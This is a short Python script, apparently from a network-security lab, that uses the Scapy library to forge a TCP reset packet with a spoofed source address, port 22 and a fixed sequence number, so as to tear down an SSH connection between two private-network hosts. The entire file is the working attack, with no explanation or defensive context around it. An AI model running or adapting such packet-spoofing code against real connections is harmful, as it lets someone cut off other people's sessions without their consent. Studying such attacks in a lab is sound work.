#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING RESET PACKET.........")
IPLayer = IP(src="192.168.0.104", dst="192.168.0.111")
TCPLayer = TCP(sport=22, dport=43826,flags="R", seq=571160984)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)

